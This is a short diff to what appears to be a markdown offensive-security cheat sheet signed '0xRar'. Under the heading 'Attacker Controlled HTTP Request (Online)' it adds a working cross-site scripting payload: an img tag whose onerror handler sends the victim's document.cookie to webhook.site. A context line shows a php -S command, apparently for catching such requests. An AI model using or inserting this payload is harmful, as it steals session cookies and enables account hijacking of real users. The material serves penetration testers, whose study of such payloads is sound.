@@ -40,4 +40,11 @@
 $ php -S IP:8008
 ```
 
+## Attacker Controlled HTTP Request (Online):
+Using: https://webhook.site/
+
+```html
+<img src=x onerror="location.href='https://webhook.site/?c='+ document.cookie">
+```
+
 **By 0xRar**
